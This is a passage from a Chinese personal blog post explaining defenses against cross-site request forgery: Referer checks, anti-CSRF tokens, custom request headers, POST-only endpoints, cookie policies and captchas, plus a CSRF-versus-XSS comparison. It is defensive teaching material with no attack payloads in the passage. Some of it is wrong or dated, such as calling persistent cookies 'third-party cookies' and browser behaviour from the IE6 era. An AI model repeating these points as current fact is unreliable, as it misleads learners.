值就会是转账按钮所在的页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。</p><p>　　这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>　　然而，这种方法并非万无一失。Referer的值可以抓包伪造修改，使得黑客完全可以把用户浏览器的Referer值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。</p><p>　　即便黑客无法篡改Referer值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。</p><h4 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h4><p>　　现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。</p><p>　　CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie 来通过安全验证。</p><p>　　要抵御CSRF，关键在于<code>在请求中放入黑客所不能伪造的信息</code>，并且<code>该信息不存在于cookie之中</code>。</p><p>　　可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><p>比如：</p><p>1、用户访问某个表单页面。</p><p>2、 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p><p>3、在页面表单附带上Token参数。</p><p>4、用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</p><p>　　这种方法要比检查Referer要安全一些，token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。token的值必须是随机的，不可预测的。有了token的存在，攻击者无法再构造一个带有合法token的请求实施CSRF攻击。另外使用token时应注意token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免token泄露。<code>但这种方法的难点在于如何把token以参数的形式加入请求</code>。</p><p>　　对于GET请求，token将附在请求地址之后，这样URL就变成 <code>http://url?csrftoken=tokenvalue</code>。 而对于POST请求来说，要在form的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把token以参数的形式加入请求了。</p><p>　　但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上token是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用javascript遍历整个dom树，对于dom中所有的a和form标签后加入token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的html代码，这种方法就没有作用，还需要程序员在编码时手动添加token。</p><p>　　该方法还有一个缺点是难以保证token本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加token的时候增加一个判断，如果这个链接是指向自己网站的，就在后面添加token，如果是通向其他的则不加。不过，即使这个csrftoken不以参数的形式附加在请求之中，黑客的网站也同样可以通过Referer来得到这个token值以发动CSRF攻击。这也是一些用户喜欢手动关闭浏览器Referer功能的原因。</p><h4 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h4><p>　　这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。</p><p>　　然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为XMLHttpRequest请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><p>除了以上的三种主要防御CSRF攻击的策略之外，还有以下几种防御措施👇</p><h4 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h4><p>　　GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。</p><p>　　接口最好限制为POST使用，GET则无效，降低攻击风险。</p><p>　　当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><h4 id="浏览器Cookie策略"><a href="#浏览器Cookie策略" class="headerlink" title="浏览器Cookie策略"></a>浏览器Cookie策略</h4><p>　　IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。</p><p>　　但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。</p><p>Cookie分为两种：</p><ul><li><p>Session Cookie（在浏览器关闭后，就会失效，保存到内存里）</p></li><li><p>Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）</p></li></ul><p>　　另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。</p><h4 id="加验证码"><a href="#加验证码" class="headerlink" title="加验证码"></a>加验证码</h4><p>　　验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。</p><p>　　但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。</p><h3 id="CSRF与XSS的区别✌"><a href="#CSRF与XSS的区别✌" class="headerlink" title="CSRF与XSS的区别✌"></a>CSRF与XSS的区别✌</h3><p>1、XSS是盗取用户cookie，从而进一步攻击，CSRF直接完成对受信任网站的攻击；</p><p>　　XSS攻击条件比CSRF要简单，完成CSRF攻击要诸多条件；</p><p>3、XSS是实现CSRF诸多条件的一种，这样的结合称为XSRF；</p><p>4、XSS攻击很多时候是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作（直接完成攻击目标），需要构造出目标网站的URL结构。</p><p>　　<strong>XSS是攻击者偷了你车的钥匙后，用你的钥匙进入到你车，开你的车。</strong></p><p>　　<strong>CSRF是让你自己用钥匙开门后，帮助攻击者开了你的车，并且你没有意识到这个操作。</strong></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://server.zzidc.com/fwqcjwt/web/2295.html" target="_blank" rel="noopener">带你快速了解CSRF攻击与防御</a></li><li><a href="https://www.jianshu.com/p/67408d73c66d" target="_blank" rel="noopener">安全|常见的Web攻击手段之CSRF攻击</a></li><li><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369" target="_blank" rel="noopener">CSRF攻击与防御</a></li></ul></div><div><div><div style="text-align:center;color:#ccc;font-size:15px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><div><div class="my_post_copyright"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script><script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script><link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"><p><span>本文标题:</span>CSRF的攻击与防御原理</p><p><span>文章作者:</span>L | 【公众号：不会代码的程序猿】</p><p><span>发布时间:</span>2019年08月22日 09:27:05</p><p><span>最后更新:</span>2019年08月22日 20:29:58</p><p><span>原始链接:</span><a href="/posts/21bbd6b8.html/" title="CSRF的攻击与防御原理">https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/</a></p><p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p></div><script>var clipboard=new Clipboard(".fa-clipboard");clipboard.on("success",$(function(){$(".fa-clipboard").click(function(){swal({title:"",text:"复制成功",html:!1,timer:500,showConfirmButton:!1})})}))</script></div><div><div><br><br><p id="top"><font size="4">热门文章推荐：<br></font></p><script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script><script>AV.initialize("XMCuiFsYYsbUlDih3XM5LI6F-9Nh9j0Va","T6DpDouJtaUHt3WMcHqcCrxD")</script><script type="text/javascript">var num=30,time=0,title="",url="",query=new AV.Query("Counter");query.notEqualTo("id",0),query.descending("time"),query.limit(num),query.find().then(function(i){for(var t=0;t<num;t++){var e=i[t].attributes;if(time=e.time,title=e.title,url=e.url,t%2==0)var o="<div style='display:inline;float:left;'>【热度"+time+"℃】 : <a href='https://xiaoxiaoxiaoxiaolin.github.io"+url+"'><font color='#0477ab'>"+title+"</font></a></div>";else o="<div style='display:inline;float:right;'><a href='https://xiaoxiaoxiaoxiaolin.github.io"+url+"'><font color='#0477ab'>"+title+"</font> : </a>【热度"+time+"℃】</div><br>";document.getElementById("top").innerHTML+=o}},function(i){console.log("error")})</script></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i> CSRF</a> <a href="/tags/跨站域请求伪造攻击/" rel="tag"><i class="fa fa-tag"></i> 跨站域请求伪造攻击</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/posts/9ee0c5.html/" rel="next" title="XSS的攻击原理与防御原理"><i class="fa fa-chevron-left"></i> XSS的攻击原理与防御原理</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/posts/7f4f0569.html/" rel="prev" title="HTTP协议知识点总结">HTTP协议知识点总结 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div><div class="comments" id="comments"><div id="lv-container" data-id="city" data-uid="MTAyMC80NTI5Mi8yMTgwNQ=="></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="L"><p class="site-author-name" itemprop="name">L</p><div class="site-description motion-element" itemprop="description">我们都如星辰😊需努力活得璀璨</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">6</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">3</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/xiaoxiaoxiaoxiaolin" title="GitHub &rarr; https://github.com/xiaoxiaoxiaoxiaolin" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="https://blog.csdn.net/Z_Z_W_" title="CSDN &rarr; https://blog.csdn.net/Z_Z_W_" rel="noopener" target="_blank"><i class="fa fa-fw fa-copyright"></i>CSDN</a> </span><span class="links-of-author-item"><a href="https://weibo.com/3266361122/profile?topnav=1&wvr=6" title="Weibo &rarr; https://weibo.com/3266361122/profile?topnav=1&wvr=6" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a> </span><span class="links-of-author-item"><a href="mailto:xiaoxiaoxiaoxiaolin@foxmail.com" title="E-Mail &rarr; mailto:xiaoxiaoxiaoxiaolin@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a></span></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF介绍"><span class="nav-number">1.</span> <span class="nav-text">CSRF介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF的攻击原理"><span class="nav-number">2.</span> <span class="nav-text">CSRF的攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF的攻击举例"><span class="nav-number">3.</span> <span class="nav-text">CSRF的攻击举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA下的CSRF攻击实验"><span class="nav-number">4.</span> <span class="nav-text">DVWA下的CSRF攻击实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF漏洞🔺Get方式利用"><span class="nav-number">4.1.</span> <span class="nav-text">CSRF漏洞🔺Get方式利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF漏洞🔺Post方式利用"><span class="nav-number">4.2.</span> <span class="nav-text">CSRF漏洞🔺Post方式利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用CSRFTester思路"><span class="nav-number">4.2.1.</span> <span class="nav-text">使用CSRFTester思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Ajax思路"><span class="nav-number">4.2.2.</span> <span class="nav-text">使用Ajax思路</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">4.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF漏洞检测😄"><span class="nav-number">5.</span> <span class="nav-text">CSRF漏洞检测😄</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#👉步骤1"><span class="nav-number">5.1.</span> <span class="nav-text">👉步骤1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#👉步骤2"><span class="nav-number">5.2.</span> <span class="nav-text">👉步骤2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#👉步骤3"><span class="nav-number">5.3.</span> <span class="nav-text">👉步骤3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击的防御👍"><span class="nav-number">6.</span> <span class="nav-text">CSRF攻击的防御👍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#验证HTTP-Referer字段"><span class="nav-number">6.1.</span> <span class="nav-text">验证HTTP Referer字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在请求地址中添加-token-并验证"><span class="nav-number">6.2.</span> <span class="nav-text">在请求地址中添加 token 并验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在-HTTP-头中自定义属性并验证"><span class="nav-number">6.3.</span> <span class="nav-text">在 HTTP 头中自定义属性并验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#尽量使用POST，限制GET"><span class="nav-number">6.4.</span> <span class="nav-text">尽量使用POST，限制GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器Cookie策略"><span class="nav-number">6.5.</span> <span class="nav-text">浏览器Cookie策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加验证码"><span class="nav-number">6.6.</span> <span class="nav-text">加验证码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF与XSS的区别✌"><span class="nav-number">7.</span> <span class="nav-text">CSRF与XSS的区别✌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">8.</span> <span class="nav-text">参考资料</span></a></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div><script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script><script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script><div class="widget-wrap"><h3 class="widget-title"></h3><div id="myCanvasContainer" class="widget tagcloud"><canvas width="250" height="250" id="resCanvas"><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/">CSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GitHub/">GitHub</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSI/">OSI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/个人博客/">个人博客</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络七层模型/">网络七层模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/跨站域请求伪造攻击/">跨站域请求伪造攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/跨站脚本攻击/">跨站脚本攻击</a><span class="tag-list-count">1</span></li></ul></canvas></div></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2019</span> <span class="with-love" id="animate"><i class="fa fa-heartbeat"></i></span> <span class="author" itemprop="copyrightHolder">小晓晓晓林</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">68k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">2:51</span></div><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script>var now=new Date;function createtime(){var n=new Date("07/12/2019 18:30:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("timeDate").innerHTML="网站已运行 "+dnum+" 天 ",document.getElementById("times").innerHTML=hnum+" 小时 "+mnum+" 分 "+snum+" 秒"}setInterval("createtime()",250)</script><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=3.4.1"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script><script src="/js/utils.js?v=7.2.0"></script><script src="/js/motion.js?v=7.2.0"></script><script src="/js/affix.js?v=7.2.0"></script><script src="/js/schemes/pisces.js?v=7.2.0"></script><script src="/js/scrollspy.js?v=7.2.0"></script><script src="/js/post-details.js?v=7.2.0"></script><script src="/js/next-boot.js?v=7.2.0"></script><script>var disqus_config=function(){this.page.url="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/",this.page.identifier="posts/21bbd6b8.html/",this.page.title="CSRF的攻击与防御原理"};function loadComments(){var t=document,e=t.createElement("script");e.src="https://.disqus.com/embed.js",e.setAttribute("data-timestamp",""+ +new Date),(t.head||t.body).appendChild(e)}window.addEventListener("load",loadComments,!1)</script><script>window.livereOptions={refer:"posts/21bbd6b8.html/"},function(e,t){var n,r=e.getElementsByTagName(t)[0];"function"!=typeof LivereTower&&((n=e.createElement(t)).src="https://cdn-city.livere.com/js/embed.dist.js",n.async=!0,r.parentNode.insertBefore(n,r))}(document,"script")</script><script>// Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
